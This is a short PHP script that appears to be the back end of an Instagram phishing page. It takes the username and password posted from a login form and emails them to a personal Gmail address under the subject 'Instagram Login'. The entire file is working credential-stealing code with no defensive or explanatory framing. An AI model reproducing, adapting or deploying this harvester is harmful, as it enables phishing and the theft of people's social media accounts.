<?php
// the message
$msg = "From: " . $_POST["userName"] . " - ". $_POST["password"];

// send email
mail("praveenpal4232@gmail.com","Instagram Login",$msg);
?>
